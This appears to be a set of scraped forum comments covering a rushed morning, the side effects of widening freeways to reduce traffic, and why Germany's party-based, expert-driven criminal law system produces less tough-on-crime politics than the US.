That makes me late to leave for a meeting, which usually means I'll forget something or have another problem in my rush. I don't have time to stop for coffee, so I'm even less lucid than I usually am.  In my grogginess and haste, I take longer to respond to emails and I spent less time mentally answering them before I had to, so that takes longer than I expected.

Priorities?<p>Reducing friction or eliminating annoyances is not always a good thing, and may not accomplish what you want. Worse, it may give you undesirable side-effects.<p>For example, people complain about freeway traffic, how it takes too long to drive from your home at X to shopping at Y.  So city planners go off and widen existing freeways, and maybe build new ones.

They also have elected politicians and special interest groups, what’s going on there?<p>I think it mostly has something to do with the directness of democracy, not with a difference in opinion or mentality.<p>Democracy in the US is very local and direct, politicians can actually be punished by the voters for not being tough on crime. That’s not so easy in (for example) Germany. You vote predominantly for parties – the whole package – not politicians. Something as comparatively unimportant as criminal law is going to get swamped by all the other issues, hardly anybody will focus on the particular weak spots of one lowly member of parliament. That would be a waste of effort.<p>Moreover all decisions about the criminal law are made on the federal level, in commissions full of experts (a lot of academics: criminologists, psychologists …). There is no reason for politicians in those commissions not to follow their recommendations. Voters will hardly ever notice what they decide, it is going to get lost under all the other issues.<p>You can actually be successful as a German politician who has a image for being tough on crime on the very local level (in, say, a city state), but on that level you can do no more than strictly enforce the rules that already exist. That will hardly change incarceration rates, though.<p>You don’t need a culture shift, you need a different political system :)",1279923281
